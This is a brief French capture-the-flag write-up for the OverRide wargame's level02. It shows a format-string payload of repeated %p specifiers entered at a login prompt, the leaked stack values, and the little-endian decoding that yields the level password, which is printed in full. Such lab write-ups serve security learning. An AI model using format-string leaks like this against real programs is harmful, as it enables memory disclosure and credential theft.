On a un printf qui lit nos arguments.

On peux taper %p pour afficher les pointeurs contenus dans le programme grâce à l'utilisation d'un printf non sécurisé.

On spamme les %p où on nous demande notre username avec la commande au moment:

```
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
```

756e505234376848 (unPR47hH)
45414a3561733951 (EAJ5as9Q)
377a7143574e6758 (7zqCWNgX)
354a35686e475873 (5J5hnGXs)
48336750664b394d (H3gPfK9M)

Soluce: on lit les var à l'envers et on reverse (little endian)

Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H